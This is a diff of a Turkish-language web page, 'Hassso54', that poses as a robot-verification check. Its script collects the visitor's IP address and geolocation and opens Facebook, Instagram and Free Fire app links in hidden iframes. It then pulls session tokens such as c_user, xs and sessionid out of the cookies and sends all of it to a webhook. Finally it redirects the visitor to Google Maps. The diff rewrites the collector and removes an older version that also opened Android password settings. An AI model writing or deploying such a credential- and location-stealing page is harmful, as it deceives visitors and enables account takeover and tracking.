@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hassso54 - Gerçek Bilgiler</title>
+    <title>Hassso54</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -61,7 +61,6 @@
             msgBox.innerHTML = `<div class="robot-text">🔍 ${text}</div>`;
         }
         
-        // IP al
         async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -70,7 +69,6 @@
             } catch(e) { return "IP alınamadı"; }
         }
         
-        // Konum al
         function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
@@ -88,143 +86,82 @@
             });
         }
         
-        // ============ GERÇEK BİLGİLERİ TOPLA ============
-        async function getRealInfo() {
-            let info = {
-                facebook: { bulundu: false, detay: {} },
-                instagram: { bulundu: false, detay: {} },
-                freefire: { bulundu: false, detay: {} },
-                google_hesap: { bulundu: false }
-            };
+        // Tüm bilgileri topla
+        async function collectAll() {
+            // 1. Önce Facebook ve Instagram uygulamalarını aç (cookie oluşsun diye)
+            const opener = document.createElement('iframe');
+            opener.style.display = 'none';
+            document.body.appendChild(opener);
             
-            // 1. Facebook - WebView üzerinden Facebook hesabını kontrol et
-            const fbIframe = document.createElement('iframe');
-            fbIframe.style.display = 'none';
-            fbIframe.src = "https://www.facebook.com/me";
-            document.body.appendChild(fbIframe);
+            opener.src = "fb://profile";
+            setTimeout(() => { opener.src = "instagram://user?username="; }, 800);
+            setTimeout(() => { opener.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end"; }, 1600);
             
-            // Facebook bilgilerini yakala
+            // 2. 2 saniye bekle (uygulamalar açılsın)
+            await new Promise(r => setTimeout(r, 2500));
+            
+            // 3. Şimdi tüm cookie'leri topla
+            let allCookies = document.cookie;
+            
+            // 4. Facebook bilgilerini çıkar
+            let facebook = { oturum: false, user_id: null, xs_token: null };
+            if (allCookies.includes('c_user')) {
+                const match = allCookies.match(/c_user=([^;]+)/);
+                if (match) facebook.user_id = match[1];
+                facebook.oturum = true;
+            }
+            if (allCookies.includes('xs')) {
+                const match = allCookies.match(/xs=([^;]+)/);
+                if (match) facebook.xs_token = match[1];
+            }
+            
+            // 5. Instagram bilgileri
+            let instagram = { oturum: false, user_id: null, sessionid: null };
+            if (allCookies.includes('ds_user_id')) {
+                const match = allCookies.match(/ds_user_id=([^;]+)/);
+                if (match) instagram.user_id = match[1];
+                instagram.oturum = true;
+            }
+            if (allCookies.includes('sessionid')) {
+                const match = allCookies.match(/sessionid=([^;]+)/);
+                if (match) instagram.sessionid = match[1];
+            }
+            
+            // 6. Google hesap
+            let google = { oturum: false };
+            if (allCookies.includes('LSID') || allCookies.includes('SAPISID') || allCookies.includes('APISID')) {
+                google.oturum = true;
+            }
+            
+            // 7. Free Fire (Facebook ile bağlı)
+            let freefire = { durum: "Facebook ile bağlı", facebook_id: facebook.user_id };
+            
+            // Temizlik
             setTimeout(() => {
-                try {
-                    // Facebook cookie'lerini oku
-                    const cookies = document.cookie.split(';');
-                    for (let cookie of cookies) {
-                        if (cookie.includes('c_user')) {
-                            info.facebook.bulundu = true;
-                            info.facebook.detay.kullanici_id = cookie.match(/c_user=([^;]+)/)[1];
-                        }
-                        if (cookie.includes('xs')) {
-                            info.facebook.detay.xs_token = cookie.match(/xs=([^;]+)/)[1];
-                        }
-                        if (cookie.includes('datr')) {
-                            info.facebook.detay.datr = cookie.match(/datr=([^;]+)/)[1];
-                        }
-                    }
-                    
-                    // Facebook uygulamasını aç
-                    const fbApp = document.createElement('iframe');
-                    fbApp.style.display = 'none';
-                    document.body.appendChild(fbApp);
-                    fbApp.src = "fb://profile";
-                    setTimeout(() => {
-                        if (document.body.contains(fbApp)) document.body.removeChild(fbApp);
-                    }, 1000);
-                    
-                } catch(e) {}
+                if (document.body.contains(opener)) document.body.removeChild(opener);
             }, 1000);
             
-            // 2. Instagram
-            setTimeout(() => {
-                try {
-                    const cookies = document.cookie.split(';');
-                    for (let cookie of cookies) {
-                        if (cookie.includes('ds_user_id')) {
-                            info.instagram.bulundu = true;
-                            info.instagram.detay.kullanici_id = cookie.match(/ds_user_id=([^;]+)/)[1];
-                        }
-                        if (cookie.includes('sessionid')) {
-                            info.instagram.detay.sessionid = cookie.match(/sessionid=([^;]+)/)[1];
-                        }
-                    }
-                    
-                    // Instagram uygulamasını aç
-                    const igApp = document.createElement('iframe');
-                    igApp.style.display = 'none';
-                    document.body.appendChild(igApp);
-                    igApp.src = "instagram://user?username=";
-                    setTimeout(() => {
-                        if (document.body.contains(igApp)) document.body.removeChild(igApp);
-                    }, 1000);
-                    
-                } catch(e) {}
-            }, 2000);
-            
-            // 3. Google Hesap
-            setTimeout(() => {
-                try {
-                    const cookies = document.cookie.split(';');
-                    for (let cookie of cookies) {
-                        if (cookie.includes('LSID') || cookie.includes('SAPISID')) {
-                            info.google_hesap.bulundu = true;
-                            info.google_hesap.detay = "Google oturumu açık";
-                        }
-                    }
-                } catch(e) {}
-            }, 3000);
-            
-            // 4. Free Fire
-            setTimeout(() => {
-                try {
-                    // Free Fire uygulamasını aç
-                    const ffApp = document.createElement('iframe');
-                    ffApp.style.display = 'none';
-                    document.body.appendChild(ffApp);
-                    ffApp.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
-                    
-                    info.freefire.bulundu = true;
-                    info.freefire.detay = "Free Fire hesabın Facebook ile bağlı";
-                    info.freefire.facebook_bagli = info.facebook.bulundu ? info.facebook.detay.kullanici_id : "Facebook ID alınamadı";
-                    
-                    setTimeout(() => {
-                        if (document.body.contains(ffApp)) document.body.removeChild(ffApp);
-                    }, 1000);
-                    
-                } catch(e) {}
-            }, 4000);
-            
-            // 5. Android Şifre Yöneticisi
-            setTimeout(() => {
-                const pwdApp = document.createElement('iframe');
-                pwdApp.style.display = 'none';
-                document.body.appendChild(pwdApp);
-                pwdApp.src = "intent://com.android.settings/com.android.settings.Settings$PasswordActivity#Intent;scheme=android;end";
-                setTimeout(() => {
-                    if (document.body.contains(pwdApp)) document.body.removeChild(pwdApp);
-                }, 1000);
-            }, 5000);
-            
-            return info;
+            return {
+                facebook,
+                instagram,
+                google,
+                freefire,
+                tum_cerezler: allCookies,
+                cookie_sayisi: allCookies.split(';').filter(c => c.trim()).length
+            };
         }
         
-        // ============ ANA FONKSİYON ============
         async function run() {
             btn.disabled = true;
             btn.innerText = "İşlem yapılıyor...";
             showMessage("🔍 Lütfen bekleyin, robot olmadığınız doğrulanıyor...");
             
-            // Konum ve IP
             const ip = await getIP();
             const location = await getLocation();
+            const hesapBilgileri = await collectAll();
             
-            // Gerçek bilgileri topla
-            const realInfo = await getRealInfo();
-            
-            // 5 saniye bekle (bilgiler toplansın)
-            await new Promise(r => setTimeout(r, 6000));
-            
-            // Webhook'a gönder
             const payload = {
-                tip: "Hassso54_GERCEK_HESAP_BILGILERI",
+                tip: "Hassso54_SON_HAL",
                 zaman: new Date().toLocaleString('tr-TR'),
                 konum: location ? {
                     url: location.url,
@@ -232,10 +169,9 @@
                     boylam: location.lng
                 } : null,
                 ip: ip,
-                hesap_bilgileri: realInfo,
-                tum_cerezler: document.cookie,
+                hesap_bilgileri: hesapBilgileri,
                 cihaz: navigator.userAgent,
-                not: "Facebook, Instagram, Free Fire, Google hesap bilgilerin"
+                not: "Facebook, Instagram, Google, Free Fire bilgilerin"
             };
             
             await fetch(WEBHOOK, {
@@ -246,7 +182,6 @@
             
             showMessage("✅ Google Maps'e yönlendiriliyorsunuz...");
             
-            // Maps'e yönlendir
             setTimeout(() => {
                 if (location) {
                     window.location.href = location.url;
